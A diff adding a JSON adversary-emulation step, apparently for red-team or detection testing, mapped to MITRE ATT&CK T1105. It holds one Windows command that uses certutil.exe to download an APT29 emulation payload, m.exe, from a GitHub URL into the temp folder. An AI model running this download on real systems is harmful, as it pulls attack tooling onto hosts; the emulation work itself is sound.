@@ -1,0 +1,19 @@
+[
+  {
+    "id": "cc-001",
+    "name": "Use Certutil.exe to download a file from a remote server",
+    "description": "This step downloads a file from a remote web server to the host using certutil.",
+    "tactic": "commandandcontrol",
+    "technique": {
+      "attack_id": "T1105",
+      "name": "Ingress Tool Transfer"
+    },
+    "type": "endpoint",
+    "platform": "windows",
+    "interface": "cmd",
+    "input_argument": "https://raw.githubusercontent.com/mitre-attack/attack-arsenal/master/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/m.exe",
+    "output_argument": "%TEMP%\\m.exe",
+    "command": "c:\\windows\\system32\\certutil.exe -urlcache -split -f input_argument output_argument",
+    "dependencies": ""
+  }
+]
